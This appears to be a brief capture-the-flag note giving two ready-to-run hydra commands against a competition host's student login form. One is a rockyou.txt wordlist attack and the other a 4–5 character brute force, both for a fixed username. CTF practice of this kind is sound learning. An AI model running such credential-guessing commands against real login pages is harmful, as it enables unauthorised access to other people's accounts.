### HTML form-data bruteforce & wordlist attack

#### Wordlist
```bash
hydra -P rockyou.txt -I -l example_user  wpiadmin.wpictf.xyz  https-post-form "/studLogin:inputUsername=example_user&inputPassword=^PASS^:Invalid username/password" 
```

#### Bruteforce
```bash
hydra -x 4:5:Aa1 -I -l example_user  wpiadmin.wpictf.xyz  https-post-form "/studLogin:inputUsername=example_user&inputPassword=^PASS^:Invalid username/password" 
```
